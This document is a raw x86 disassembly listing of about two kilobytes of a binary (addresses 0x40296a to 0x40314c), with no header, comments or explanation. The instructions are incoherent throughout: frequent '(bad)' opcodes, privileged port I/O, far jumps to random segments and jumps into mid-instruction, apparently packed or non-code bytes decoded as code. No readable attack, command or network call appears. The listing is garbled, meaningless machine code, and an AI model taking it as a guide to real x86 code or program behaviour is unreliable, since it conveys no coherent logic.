  40296a:	lds    edi,FWORD PTR [ebx]
  40296c:	add    ecx,DWORD PTR [ebp+edi*8-0x5d8025c4]
  402973:	clc    
  402974:	gs fdiv st(6),st
  402977:	push   ebp
  402978:	inc    eax
  402979:	adc    al,0x94
  40297b:	add    eax,0x64427c5b
  402980:	pop    ecx
  402981:	mov    esi,eax
  402983:	add    eax,0xc02e0f54
  402988:	arpl   WORD PTR [eax-0x550fc880],dx
  40298e:	jb     0x40296e
  402990:	cmp    BYTE PTR [eax-0x57],dl
  402993:	test   al,0xf6
  402995:	mov    ch,0xa9
  402997:	add    eax,0x5935743c
  40299c:	mov    DWORD PTR [edx-0x65850742],esp
  4029a2:	or     al,0xf8
  4029a4:	push   ecx
  4029a5:	retf   
  4029a6:	push   0xd0a9cb8a
  4029ab:	xchg   DWORD PTR [eax-0x259f9db3],eax
  4029b1:	sti    
  4029b2:	push   edi
  4029b3:	icebp  
  4029b4:	or     dh,BYTE PTR [eax]
  4029b6:	outs   dx,BYTE PTR ds:[esi]
  4029b7:	jns    0x402a38
  4029b9:	ja     0x40293e
  4029bb:	mov    eax,0xfb0a88eb
  4029c0:	test   eax,0x237ce6e8
  4029c5:	jns    0x402a32
  4029c7:	mov    ebx,0x37ca7354
  4029cc:	add    dl,BYTE PTR [ebx]
  4029ce:	sub    al,dh
  4029d0:	mov    WORD PTR ds:0x76a3b9e2,gs
  4029d6:	mov    bl,0xf3
  4029d8:	or     al,0x14
  4029da:	call   0x4552666c
  4029df:	mov    eax,0x307d7a5b
  4029e4:	dec    esp
  4029e5:	dec    ebx
  4029e6:	inc    edx
  4029e7:	push   ds
  4029e8:	lds    edx,FWORD PTR [ebp-0x21b5c1df]
  4029ee:	pop    edi
  4029ef:	cmp    cl,cl
  4029f1:	sub    BYTE PTR [ebx-0x487f47c0],bl
  4029f7:	scas   al,BYTE PTR es:[edi]
  4029f8:	sub    DWORD PTR [eax],ecx
  4029fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029fb:	or     al,0xcd
  4029fd:	lock xor eax,DWORD PTR [edi+0xd50b433]
  402a04:	das    
  402a05:	and    al,0x58
  402a07:	dec    ebp
  402a08:	fisubr WORD PTR [ebx-0x2b]
  402a0b:	cdq    
  402a0c:	cmp    bh,BYTE PTR [edi+0x371eb66d]
  402a12:	xor    ebx,0xffffff99
  402a15:	inc    edx
  402a16:	sub    BYTE PTR [ebx-0x1fe060a2],bl
  402a1c:	rol    DWORD PTR [esi],cl
  402a1e:	adc    ch,dh
  402a20:	retf   
  402a21:	sahf   
  402a22:	out    dx,al
  402a23:	es js  0x402a96
  402a26:	mov    dh,0xc0
  402a28:	inc    edx
  402a29:	popa   
  402a2a:	xor    al,0x55
  402a2c:	dec    edi
  402a2d:	xor    BYTE PTR [edi+edi*4],ah
  402a30:	mov    al,ds:0x1b4299e0
  402a35:	and    bh,BYTE PTR [edi]
  402a37:	outs   dx,BYTE PTR ds:[esi]
  402a38:	test   eax,0xba59bf9a
  402a3d:	sub    bl,bl
  402a3f:	push   edx
  402a40:	es push edx
  402a42:	push   ds
  402a43:	jmp    0x402a14
  402a45:	(bad)  
  402a46:	pop    ebx
  402a47:	or     esi,DWORD PTR [esi]
  402a49:	test   al,0x21
  402a4b:	jbe    0x402a7e
  402a4d:	inc    ecx
  402a4e:	enter  0x243,0x1
  402a52:	cli    
  402a53:	test   BYTE PTR [ecx-0x27],dh
  402a56:	dec    eax
  402a57:	dec    esi
  402a58:	cmp    ah,BYTE PTR [edi+esi*1]
  402a5b:	loopne 0x402a33
  402a5d:	aas    
  402a5e:	clc    
  402a5f:	sbb    eax,DWORD PTR [edi]
  402a61:	inc    edx
  402a62:	and    eax,0x6bc3db5f
  402a67:	scas   eax,DWORD PTR es:[edi]
  402a68:	(bad)  
  402a6a:	ins    WORD PTR es:[edi],dx
  402a6c:	lea    ebp,ds:0x9f1de8bc
  402a72:	add    edx,ebx
  402a74:	sub    dl,BYTE PTR [ebp+0x3a]
  402a77:	imul   ebx,DWORD PTR [ebx],0x5e
  402a7a:	lds    ecx,FWORD PTR [esp+ebx*1-0x99d8686]
  402a81:	stos   BYTE PTR es:[edi],al
  402a82:	(bad)  [esi]
  402a84:	shl    DWORD PTR [edx-0x6c],1
  402a87:	in     al,dx
  402a88:	pop    ecx
  402a89:	push   esi
  402a8a:	(bad)  
  402a8b:	xchg   esp,eax
  402a8c:	in     al,0x74
  402a8e:	ja     0x402a9e
  402a90:	add    al,0x38
  402a92:	and    ch,al
  402a94:	pop    ebx
  402a95:	cmp    BYTE PTR [ebp+0x49421c3],bl
  402a9b:	stc    
  402a9c:	or     al,0xea
  402a9e:	add    eax,0x1ce9cca0
  402aa3:	mov    al,ds:0xb0c7c220
  402aa8:	shr    DWORD PTR [ebp-0x14],1
  402aab:	pop    edx
  402aac:	cwde   
  402aad:	mul    ecx
  402aaf:	xor    eax,DWORD PTR [ebx-0x4be14d8]
  402ab5:	push   esi
  402ab6:	pusha  
  402ab7:	add    dl,bl
  402ab9:	(bad)  
  402aba:	repz and al,0x30
  402abd:	or     esi,DWORD PTR [edx]
  402abf:	ins    DWORD PTR es:[edi],dx
  402ac0:	sub    DWORD PTR [esi+0x4c],edx
  402ac3:	lods   eax,DWORD PTR ds:[esi]
  402ac4:	scas   al,BYTE PTR es:[edi]
  402ac5:	or     DWORD PTR cs:[edx+edi*4+0x2804ac1d],ecx
  402acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ace:	ss or  al,0x3e
  402ad1:	jbe    0x402a9f
  402ad3:	ss push cs
  402ad5:	dec    edi
  402ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ad7:	mov    eax,ss
  402ad9:	lahf   
  402ada:	pushfw 
  402adc:	and    al,0xc5
  402ade:	fstp   QWORD PTR [eax-0x3238228b]
  402ae4:	mov    ah,0xb7
  402ae6:	add    al,0xfd
  402ae8:	xchg   edx,eax
  402ae9:	retf   
  402aea:	leave  
  402aeb:	xor    esp,DWORD PTR [ecx-0x8d5fa68]
  402af1:	popf   
  402af2:	fcom   st(2)
  402af4:	hlt    
  402af5:	jmp    0xdd5d:0x36da3571
  402afc:	and    DWORD PTR [eax],eax
  402afe:	std    
  402aff:	dec    edi
  402b00:	into   
  402b01:	and    BYTE PTR [ebp+0x25],bh
  402b04:	push   edx
  402b05:	mov    ss,edi
  402b07:	(bad)  
  402b08:	scas   eax,DWORD PTR es:[edi]
  402b09:	(bad)  
  402b0a:	fld    QWORD PTR [esi+0x4e]
  402b0d:	push   ss
  402b0e:	ins    DWORD PTR es:[edi],dx
  402b0f:	lea    ebx,[esi-0x47]
  402b12:	pushf  
  402b13:	stos   DWORD PTR es:[edi],eax
  402b14:	je     0x402b78
  402b16:	xchg   edi,eax
  402b17:	push   ebx
  402b18:	fbstp  TBYTE PTR [edx]
  402b1a:	sub    BYTE PTR [edi-0x69],dl
  402b1d:	not    DWORD PTR [edi+0x1]
  402b20:	mov    edi,0xa54974f4
  402b25:	test   BYTE PTR ds:0xeff8f0a0,bl
  402b2b:	mov    dh,0x10
  402b2d:	and    edx,DWORD PTR [eax+ebp*4]
  402b30:	pop    edi
  402b31:	dec    ebp
  402b32:	les    esi,FWORD PTR [ebp-0x2481cbf2]
  402b38:	mov    al,ds:0xdd4e68a4
  402b3d:	rol    BYTE PTR [edx+ebx*4],0x68
  402b41:	mov    esp,0xfbe04ba7
  402b46:	pop    esp
  402b47:	shl    DWORD PTR [eax+edi*4-0x4fb17d82],0xbe
  402b4f:	gs mov ebp,0x9b8aff8a
  402b55:	popf   
  402b56:	mov    DWORD PTR ds:0x6e7ba63f,ecx
  402b5c:	or     BYTE PTR [eax],al
  402b5e:	popa   
  402b5f:	enter  0xdc0a,0xad
  402b63:	loopne 0x402b0b
  402b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b66:	icebp  
  402b67:	shl    BYTE PTR [esi-0x69c022ed],cl
  402b6d:	jg     0x402b32
  402b6f:	pusha  
  402b70:	xor    esi,DWORD PTR [esi]
  402b72:	les    eax,FWORD PTR ds:0x838fa4e3
  402b78:	mov    esp,0x92e1aa7c
  402b7d:	clc    
  402b7e:	adc    DWORD PTR [esp+edx*4+0x8],0x89beda9
  402b86:	xor    BYTE PTR [edi+0x50],bh
  402b89:	dec    ebp
  402b8a:	jp     0x402be8
  402b8c:	and    dh,BYTE PTR [edx+0x16]
  402b8f:	int3   
  402b90:	dec    ebx
  402b91:	add    BYTE PTR gs:[ebp+0x5015fbcb],cl
  402b98:	jae    0x402b99
  402b9a:	pop    ds
  402b9b:	lahf   
  402b9c:	hlt    
  402b9d:	sub    eax,eax
  402b9f:	(bad)  
  402ba0:	(bad)  
  402ba2:	jp     0x402bd8
  402ba4:	push   0xffffffe2
  402ba6:	xor    ebx,eax
  402ba8:	mov    eax,ds:0x5bb4a292
  402bad:	jnp    0x402bbd
  402baf:	push   eax
  402bb0:	jmp    0x5d057bc0
  402bb5:	ins    BYTE PTR es:[edi],dx
  402bb6:	jmp    0x402bc9
  402bb8:	push   ebp
  402bb9:	xor    al,0x52
  402bbb:	push   0xb4416c64
  402bc0:	inc    dx
  402bc2:	fs dec bh
  402bc5:	mov    ebx,0xefa8ed0f
  402bca:	stos   DWORD PTR es:[edi],eax
  402bcb:	push   cs
  402bcc:	ins    DWORD PTR es:[edi],dx
  402bcd:	jns    0x402bd3
  402bcf:	loopne 0x402b88
  402bd1:	ds out dx,al
  402bd3:	ret    
  402bd4:	mov    ds:0x972e32db,al
  402bd9:	push   ecx
  402bda:	and    al,0x67
  402bdc:	or     bl,bl
  402bde:	and    dh,BYTE PTR [esp+ebx*8+0xf]
  402be2:	add    edi,edi
  402be4:	stos   DWORD PTR es:[edi],eax
  402be5:	cwde   
  402be6:	in     eax,dx
  402be7:	aas    
  402be8:	pusha  
  402be9:	fwait
  402bea:	xchg   ebx,edi
  402bec:	push   ebp
  402bed:	inc    ebx
  402bee:	aad    0xef
  402bf0:	dec    ebp
  402bf1:	push   ecx
  402bf2:	or     edx,ebp
  402bf4:	push   cs
  402bf5:	(bad)  
  402bf6:	mov    ah,0x6c
  402bf8:	mov    edi,0xce322e4e
  402bfd:	add    esp,DWORD PTR [eax]
  402bff:	mov    edi,ss
  402c01:	loopne 0x402b9b
  402c03:	fst    st(4)
  402c05:	shl    bh,cl
  402c07:	or     al,bh
  402c09:	jo     0x402bd4
  402c0b:	cli    
  402c0c:	push   0x24
  402c0e:	(bad)  
  402c0f:	bound  ebp,QWORD PTR [edx+0x1c]
  402c12:	pop    es
  402c13:	fist   DWORD PTR ds:0x357df6
  402c19:	fbstp  TBYTE PTR [ebx]
  402c1b:	ror    esi,0x54
  402c1e:	mov    bh,0x3d
  402c20:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402c22:	imul   DWORD PTR [ecx-0x15cd831a]
  402c28:	push   0x7b
  402c2a:	xor    DWORD PTR [edx+eiz*8+0xc72f598],esp
  402c31:	je     0x402c74
  402c33:	inc    esp
  402c34:	xchg   ebx,eax
  402c35:	repnz mov esi,0xd0e72e72
  402c3b:	call   0x7e17:0x6ea378d0
  402c42:	dec    esi
  402c43:	mov    ecx,0x6f3395b8
  402c48:	inc    esi
  402c49:	xor    edi,esp
  402c4b:	xor    esi,ebp
  402c4d:	dec    esi
  402c4e:	push   esp
  402c4f:	out    0x34,al
  402c51:	fldenv [ecx]
  402c53:	push   ecx
  402c54:	add    eax,0xebc0884d
  402c59:	retf   
  402c5a:	sub    esi,DWORD PTR [esi-0x51]
  402c5d:	jns    0x402c80
  402c5f:	test   eax,0x9f9f43bf
  402c64:	inc    ebx
  402c65:	xchg   BYTE PTR [edi+0x5f945ba4],dh
  402c6b:	(bad)  
  402c6d:	jmp    0x1855d713
  402c72:	jg     0x402ca4
  402c74:	mov    DWORD PTR ss:[esi-0x2c5be7ef],ecx
  402c7b:	ret    
  402c7c:	jp     0x402c7c
  402c7e:	xchg   edx,eax
  402c7f:	aad    0x36
  402c81:	nop
  402c82:	adc    al,0xca
  402c84:	adc    eax,0x68c951b5
  402c89:	imul   ecx,DWORD PTR [ebp-0x33c730c3],0xaf8dcf1
  402c93:	popa   
  402c94:	cli    
  402c95:	into   
  402c96:	das    
  402c97:	mov    al,ds:0x69bf0c35
  402c9c:	repz test DWORD PTR [esi+eax*2-0x3425a6f8],eax
  402ca4:	pop    ecx
  402ca5:	ror    BYTE PTR [ebx-0x2a],cl
  402ca8:	dec    DWORD PTR [esi+0x39aa8309]
  402cae:	(bad)  
  402caf:	fsubr  DWORD PTR [ebx+0x30dc6a1c]
  402cb5:	add    DWORD PTR [eax+0x44432782],edi
  402cbb:	and    DWORD PTR [edx+0x7b],esp
  402cbe:	call   0xe77d2e43
  402cc3:	xchg   ecx,eax
  402cc4:	ret    0xacec
  402cc7:	sbb    eax,0x9e0f14af
  402ccc:	call   0xcf0453e1
  402cd1:	jnp    0x402d41
  402cd3:	and    BYTE PTR [esp+ecx*4],dh
  402cd6:	loop   0x402cc0
  402cd8:	sbb    DWORD PTR [eax+esi*2+0x1d],0xffffffe5
  402cdd:	int3   
  402cde:	ftst   
  402ce0:	mov    al,ds:0x18edebb8
  402ce5:	fucom  st(1)
  402ce7:	mov    bl,0x57
  402ce9:	jmp    0x402c87
  402ceb:	mov    al,ds:0x3b583656
  402cf0:	or     eax,0xb6131475
  402cf5:	or     bl,bh
  402cf7:	push   eax
  402cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf9:	sbb    eax,DWORD PTR ds:0xbdb085dc
  402cff:	mov    ds:0x37a53ab7,eax
  402d04:	jb     0x402cc6
  402d06:	stos   BYTE PTR es:[edi],al
  402d07:	scas   eax,DWORD PTR es:[edi]
  402d08:	dec    eax
  402d09:	dec    esp
  402d0a:	push   ss
  402d0b:	pop    esp
  402d0c:	pop    esi
  402d0d:	shl    DWORD PTR [edi+eax*1],0xd2
  402d11:	xor    al,0xcc
  402d13:	enter  0xe0f2,0x38
  402d17:	sbb    al,0x74
  402d19:	inc    esi
  402d1a:	addr16 mov esi,ecx
  402d1d:	aad    0x19
  402d1f:	jmp    0xa63:0x8b077efe
  402d26:	daa    
  402d27:	(bad)  
  402d28:	jecxz  0x402cd7
  402d2a:	adc    eax,0x1d97e1f2
  402d2f:	jecxz  0x402d1a
  402d31:	(bad)  
  402d32:	lds    ebp,FWORD PTR [ebp-0x7d]
  402d35:	xor    edx,eax
  402d37:	sbb    eax,0x32c57b7d
  402d3c:	and    eax,0x7caf579f
  402d41:	inc    eax
  402d42:	scas   al,BYTE PTR es:[edi]
  402d43:	test   al,0x24
  402d45:	mov    ecx,0x5d2e6536
  402d4a:	mov    ecx,0x99806a95
  402d4f:	mov    ecx,0x90ddf3e8
  402d54:	call   0xf9b33e46
  402d59:	adc    ebx,DWORD PTR [ebx]
  402d5b:	push   esi
  402d5c:	sar    BYTE PTR [edi+ebp*2-0x17],1
  402d60:	cmp    al,0x4d
  402d62:	cmp    eax,0xa13152d2
  402d67:	xchg   ebx,eax
  402d68:	retf   
  402d69:	pop    edi
  402d6a:	fld    TBYTE PTR ds:0xd808208f
  402d70:	xor    BYTE PTR [esi-0x7f0ac6a],al
  402d76:	and    DWORD PTR [ebp+0x5298e3d8],edi
  402d7c:	add    eax,0xb1bd5121
  402d81:	popa   
  402d82:	jmp    0x9b01cc1d
  402d87:	sbb    dl,dh
  402d89:	mov    ecx,DWORD PTR [ecx-0x22e2e6cf]
  402d8f:	sbb    ecx,0x22ff6c85
  402d95:	cmp    DWORD PTR [ebx+0x61bb0292],edi
  402d9b:	sbb    BYTE PTR ds:0x2fae3a6a,dl
  402da1:	fwait
  402da2:	xchg   ecx,eax
  402da3:	cmp    bh,BYTE PTR [ebp+0x67]
  402da6:	mov    WORD PTR [ecx],es
  402da8:	outs   dx,BYTE PTR ds:[esi]
  402da9:	(bad)  
  402daa:	sub    BYTE PTR [edi],dh
  402dac:	pop    eax
  402dad:	inc    ecx
  402dae:	test   dl,al
  402db0:	les    esi,FWORD PTR [ecx+ecx*1+0x2e3ea7a4]
  402db7:	jle    0x402d58
  402db9:	and    bh,BYTE PTR [eax+0x5f]
  402dbc:	pop    ebp
  402dbd:	add    BYTE PTR [eax-0x38],ah
  402dc0:	fnsave [esi+0x14]
  402dc3:	ins    BYTE PTR es:[edi],dx
  402dc4:	cmc    
  402dc5:	in     al,0x4c
  402dc7:	pop    esi
  402dc8:	ins    BYTE PTR es:[edi],dx
  402dc9:	cmp    BYTE PTR [eax+0x3337af15],dh
  402dcf:	add    bl,BYTE PTR [ecx]
  402dd1:	mov    dh,0xd5
  402dd3:	imul   eax,DWORD PTR [ebp-0x3c5059aa],0x16
  402dda:	test   BYTE PTR [ebx-0x23],al
  402ddd:	push   eax
  402dde:	and    DWORD PTR [ebx],0xe7a326d6
  402de4:	jae    0x402e63
  402de6:	and    al,0xf4
  402de8:	inc    ebx
  402de9:	xor    BYTE PTR [eax-0x4e],0x9c
  402ded:	lahf   
  402dee:	add    BYTE PTR [ecx+ebp*1+0x1ff17f7a],dh
  402df5:	pop    ebx
  402df6:	push   ss
  402df7:	leave  
  402df8:	xchg   BYTE PTR [ecx+esi*8-0x14],bl
  402dfc:	xchg   BYTE PTR [ecx-0x76498346],dl
  402e02:	dec    eax
  402e03:	das    
  402e04:	adc    eax,0xc9603572
  402e09:	les    eax,FWORD PTR [ebx]
  402e0b:	mov    eax,ebp
  402e0d:	je     0x402de4
  402e0f:	push   edx
  402e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e11:	out    dx,eax
  402e12:	pop    ds
  402e13:	bound  esp,QWORD PTR [edi+edi*8]
  402e16:	fs sti 
  402e18:	sub    BYTE PTR [ebx+eax*8+0x4cfc7979],bh
  402e1f:	inc    esp
  402e20:	push   es
  402e21:	sub    al,0xb0
  402e23:	cs pop ds
  402e25:	sub    DWORD PTR [edi-0x41a6cee2],ebp
  402e2b:	inc    ebp
  402e2c:	xchg   edx,eax
  402e2d:	sub    edx,DWORD PTR [bx-0x9b5]
  402e32:	xchg   edx,eax
  402e33:	sub    edx,DWORD PTR cs:0xca468d65
  402e3a:	test   cl,0xb6
  402e3d:	jmp    0x64ea:0xeffbeed3
  402e44:	sub    DWORD PTR [eax+0x22],0x11
  402e48:	jb     0x402df9
  402e4a:	call   0x7635:0x5acc2b56
  402e51:	adc    dh,BYTE PTR [ebp+0x48fb9619]
  402e57:	sbb    eax,DWORD PTR [ebx-0x5e2d0bbe]
  402e5d:	ficom  WORD PTR [eax+0x386d78fa]
  402e63:	call   0x68e5bca4
  402e68:	mov    ch,0x13
  402e6a:	push   edx
  402e6b:	mov    bl,0xa0
  402e6d:	push   esp
  402e6e:	sbb    ebx,DWORD PTR [ecx-0x4fb368f3]
  402e74:	inc    esp
  402e75:	adc    DWORD PTR [ecx-0x35f41a13],ebx
  402e7b:	mov    ds,WORD PTR [esi-0x19e08842]
  402e81:	cdq    
  402e82:	adc    DWORD PTR ds:0x5fba9593,edi
  402e88:	fstp   DWORD PTR [ecx+0x68276e58]
  402e8e:	rol    BYTE PTR [ecx-0x34bf0c97],1
  402e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e96:	mov    ebp,0x7ef1ef98
  402e9b:	jmp    0x210b:0x809f68ec
  402ea2:	add    al,cl
  402ea4:	sbb    eax,0x681c0f20
  402ea9:	xchg   BYTE PTR [ecx],al
  402eab:	or     eax,0x20260943
  402eb0:	jmp    0x78fa:0xf1dd9f84
  402eb7:	adc    al,0xfe
  402eb9:	and    edi,edi
  402ebb:	inc    DWORD PTR [edi]
  402ebd:	fsubr  st,st(4)
  402ebf:	xchg   esp,eax
  402ec0:	(bad)  
  402ec1:	dec    BYTE PTR [ecx+0x4a9ec593]
  402ec7:	pop    es
  402ec8:	inc    edx
  402ec9:	retf   
  402eca:	stos   DWORD PTR es:[edi],eax
  402ecb:	sub    DWORD PTR [edi+0x157009d9],ebx
  402ed1:	push   0x6fcb390
  402ed6:	jle    0x402f1e
  402ed8:	pop    edx
  402ed9:	adc    BYTE PTR [bp+di],0x80
  402edd:	scas   al,BYTE PTR es:[edi]
  402ede:	pushf  
  402edf:	inc    edi
  402ee0:	fisubr WORD PTR [eax]
  402ee2:	rcl    DWORD PTR [ecx+esi*4-0x6e],1
  402ee6:	xchg   esp,esp
  402ee8:	out    dx,eax
  402ee9:	rol    BYTE PTR [edi+esi*4],0xb5
  402eed:	js     0x402e9e
  402eef:	sbb    ecx,edx
  402ef1:	pop    edx
  402ef2:	inc    ecx
  402ef3:	pop    eax
  402ef4:	pop    ebx
  402ef5:	retf   0x2be8
  402ef8:	outs   dx,DWORD PTR ds:[esi]
  402ef9:	xchg   esp,eax
  402efa:	xchg   ebp,eax
  402efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402efc:	xchg   ebp,eax
  402efd:	mov    ch,0x37
  402eff:	out    0xef,eax
  402f01:	pop    eax
  402f02:	inc    ebx
  402f03:	sub    eax,0xf35fdc19
  402f08:	inc    ebx
  402f09:	xchg   esp,eax
  402f0a:	or     al,0x10
  402f0d:	mov    dl,0xbb
  402f0f:	pop    esp
  402f10:	into   
  402f11:	dec    edi
  402f12:	mov    ah,0xa3
  402f14:	ins    DWORD PTR es:[edi],dx
  402f15:	sub    eax,0x569d17f0
  402f1a:	gs cs add esi,eax
  402f1e:	add    ebx,ebp
  402f20:	jo     0x402f50
  402f22:	pop    es
  402f23:	cmp    al,0xa3
  402f25:	sub    ecx,DWORD PTR [esi]
  402f27:	inc    ebx
  402f28:	cli    
  402f29:	stc    
  402f2a:	test   eax,0x79ece651
  402f2f:	mov    cl,0x35
  402f31:	fst    DWORD PTR [ebx]
  402f33:	ror    DWORD PTR [ebp-0x64],1
  402f36:	cmp    eax,DWORD PTR [edx+0x5bf61c9b]
  402f3c:	or     eax,0xc6f0b7ed
  402f41:	xor    al,0x7
  402f43:	jle    0x402f22
  402f45:	or     BYTE PTR [ebp-0x63f6ca22],al
  402f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f4c:	and    edi,DWORD PTR ds:0x98249622
  402f52:	pop    ss
  402f53:	xor    edi,ebp
  402f55:	fs inc ecx
  402f57:	rol    BYTE PTR [ecx],0x29
  402f5a:	repz mov bh,bh
  402f5d:	mov    DWORD PTR [ecx-0x4d],esp
  402f60:	mov    dl,BYTE PTR [edx]
  402f62:	adc    DWORD PTR [edi],eax
  402f64:	hlt    
  402f65:	cmp    edx,DWORD PTR [edx-0x4f39555b]
  402f6b:	inc    eax
  402f6c:	sti    
  402f6d:	scas   al,BYTE PTR es:[edi]
  402f6e:	dec    esi
  402f6f:	sub    BYTE PTR [eax-0x2e],0xf1
  402f73:	es dec edx
  402f75:	pop    esi
  402f76:	daa    
  402f77:	arpl   dx,di
  402f79:	and    al,0x69
  402f7b:	out    0xef,al
  402f7d:	add    al,0xa4
  402f7f:	jbe    0x402f78
  402f81:	test   al,0xe2
  402f83:	mov    ecx,0xf7af3eb2
  402f88:	xor    ebx,DWORD PTR ds:0x2a78707d
  402f8e:	xchg   BYTE PTR [ebp+esi*1+0x66],cl
  402f92:	add    DWORD PTR [eax],edi
  402f94:	mov    ds,WORD PTR [ebp-0x1e6c9b22]
  402f9a:	jmp    0x402fa1
  402f9c:	add    al,0x45
  402f9e:	or     edi,edx
  402fa0:	arpl   dx,cx
  402fa2:	push   eax
  402fa3:	je     0x402f66
  402fa5:	test   dh,bl
  402fa7:	cli    
  402fa8:	imul   edx,DWORD PTR [eax+0x5f],0xa01ff071
  402faf:	jecxz  0x402f56
  402fb1:	repz mov bl,0x6f
  402fb4:	jnp    0x402f66
  402fb6:	sbb    eax,0x607cd8bb
  402fbb:	test   edx,esp
  402fbd:	adc    al,0xab
  402fbf:	pushf  
  402fc0:	loop   0x402f8f
  402fc2:	pop    es
  402fc3:	(bad)  
  402fc4:	pop    edx
  402fc5:	popf   
  402fc6:	dec    eax
  402fc7:	mov    edi,0xfc8261a4
  402fcc:	or     DWORD PTR [edi+0x724b77a5],edx
  402fd2:	and    DWORD PTR [ecx+eiz*4+0x1968bcc2],0x2b
  402fda:	push   ecx
  402fdb:	out    0x1d,eax
  402fdd:	sar    dh,1
  402fdf:	mov    edi,0x98dbf80f
  402fe4:	adc    al,0xb1
  402fe6:	jno    0x402ff4
  402fe8:	outs   dx,DWORD PTR ds:[esi]
  402fe9:	(bad)  
  402fea:	(bad)  
  402feb:	adc    DWORD PTR [ebx],ebp
  402fed:	pop    ds
  402fee:	aam    0x65
  402ff0:	inc    eax
  402ff1:	mov    ebp,0xa7ae99c
  402ff6:	mov    bl,0x6d
  402ff8:	lods   eax,DWORD PTR ds:[esi]
  402ff9:	add    al,0x29
  402ffb:	in     al,0xa0
  402ffd:	cmp    DWORD PTR [ebx-0x4179116],edi
  403003:	inc    esp
  403004:	jne    0x402fab
  403006:	xchg   ebp,eax
  403007:	int3   
  403008:	jmp    0x74e9b971
  40300d:	and    BYTE PTR [esi],bh
  40300f:	test   eax,0x2ed2b44
  403014:	test   eax,0xd7635600
  403019:	out    dx,al
  40301a:	mov    esp,0xb0690536
  40301f:	test   eax,0xaa6cd55e
  403024:	push   es
  403025:	mov    ch,0xcd
  403027:	mov    al,0xd5
  403029:	mov    ah,0x7
  40302b:	lahf   
  40302c:	dec    BYTE PTR [ebp+0x28d6862b]
  403032:	cmp    BYTE PTR [edx],0x41
  403035:	call   0x435f9d9d
  40303a:	aad    0x29
  40303c:	or     DWORD PTR [ecx-0x76c12de4],esp
  403042:	adc    cl,BYTE PTR [esp+esi*2]
  403045:	loope  0x40307d
  403047:	in     eax,0xc
  403049:	sbb    ebp,DWORD PTR [eax-0x6e]
  40304c:	mov    ah,0x3a
  40304e:	sub    esi,DWORD PTR [ecx-0x38]
  403051:	cdq    
  403052:	in     al,dx
  403053:	js     0x402ff5
  403055:	(bad)  
  403056:	mov    edi,0xa1cb2b0
  40305b:	add    edi,DWORD PTR [eax-0x49495584]
  403061:	pop    eax
  403062:	out    dx,eax
  403063:	pop    esi
  403064:	add    BYTE PTR [edi+0x182f098d],cl
  40306a:	xchg   esi,eax
  40306b:	pop    ds
  40306c:	xchg   edx,eax
  40306d:	cmp    dh,BYTE PTR [ebp-0x29]
  403070:	gs aad 0x54
  403073:	xor    al,0x4b
  403075:	and    BYTE PTR [ecx-0x68],al
  403078:	es stos BYTE PTR es:[edi],al
  40307a:	xchg   BYTE PTR [edx+0x39a08f89],cl
  403080:	add    al,0xce
  403082:	outs   dx,DWORD PTR ds:[esi]
  403083:	(bad)  [ebx]
  403085:	sti    
  403086:	lds    ecx,FWORD PTR [ebp+0x4a]
  403089:	aam    0xe7
  40308b:	(bad)  
  40308c:	int3   
  40308d:	jl     0x4030b7
  40308f:	xchg   edx,eax
  403090:	les    edx,FWORD PTR [ebx]
  403092:	loopne 0x403077
  403094:	imul   edx,DWORD PTR [edi-0x32],0x48
  403098:	outs   dx,DWORD PTR ds:[esi]
  403099:	ret    
  40309a:	pop    ss
  40309b:	out    0x83,al
  40309d:	lds    ecx,FWORD PTR [esi]
  40309f:	pop    ecx
  4030a0:	data16 cmp ah,ch
  4030a3:	ins    BYTE PTR es:[edi],dx
  4030a4:	mov    ds:0x60fb1557,al
  4030a9:	push   cs
  4030aa:	push   esp
  4030ab:	add    DWORD PTR [edi-0x22],edx
  4030ae:	in     eax,dx
  4030af:	je     0x4030f7
  4030b1:	int    0x1d
  4030b3:	into   
  4030b4:	arpl   WORD PTR [edx+0x18],bx
  4030b7:	fadd   DWORD PTR [ebx+0x1272b36a]
  4030bd:	adc    BYTE PTR [esp+ebx*4],dl
  4030c0:	clc    
  4030c1:	into   
  4030c2:	sbb    ebx,DWORD PTR [ecx+0x73]
  4030c5:	call   0x6a20:0x29b33b22
  4030cc:	xchg   ebp,eax
  4030cd:	xchg   BYTE PTR [edx+eiz*8],ah
  4030d0:	popf   
  4030d1:	xor    eax,0xd51b5d53
  4030d6:	inc    ebp
  4030d7:	and    esp,esi
  4030d9:	sbb    al,0x3b
  4030db:	sbb    al,0xd5
  4030dd:	test   esp,0x2f0509c8
  4030e3:	or     eax,0x984243c2
  4030e8:	cmp    BYTE PTR [edx+0x64d38f89],cl
  4030ee:	jmp    0x403074
  4030f0:	dec    ebx
  4030f1:	or     eax,0x9c37aec2
  4030f6:	mov    ecx,0x8a9836ca
  4030fb:	mov    ebp,0xf2d89ff2
  403100:	shr    edi,1
  403102:	sbb    al,dl
  403104:	jo     0x4030a3
  403106:	jne    0x403169
  403108:	cmp    dl,dh
  40310a:	and    DWORD PTR [eax+0x2b386e2f],edx
  403110:	retf   0x9b21
  403113:	icebp  
  403114:	mov    ch,0xf0
  403116:	cmp    BYTE PTR [edi-0x4d],bl
  403119:	out    0xfd,eax
  40311b:	or     eax,0x63d22256
  403120:	ins    DWORD PTR es:[edi],dx
  403121:	scas   eax,DWORD PTR es:[edi]
  403122:	fisttp WORD PTR ds:0x18d31171
  403128:	add    BYTE PTR [eax],bh
  40312a:	push   ebp
  40312b:	dec    ecx
  40312c:	mov    eax,0xb19dcc81
  403131:	mov    dl,0xfe
  403133:	xor    ah,BYTE PTR [eax-0xca17fb6]
  403139:	jns    0x403100
  40313b:	leave  
  40313c:	bound  edi,QWORD PTR [ebx-0x5a]
  40313f:	cld    
  403140:	js     0x403194
  403142:	mov    ah,0xd4
  403144:	std    
  403145:	or     DWORD PTR [edi+0x682ac0f7],edi
  40314b:	lods   eax,DWORD PTR ds:[esi]
  40314c:	cmp    BYTE PTR [edx-0x51],ah
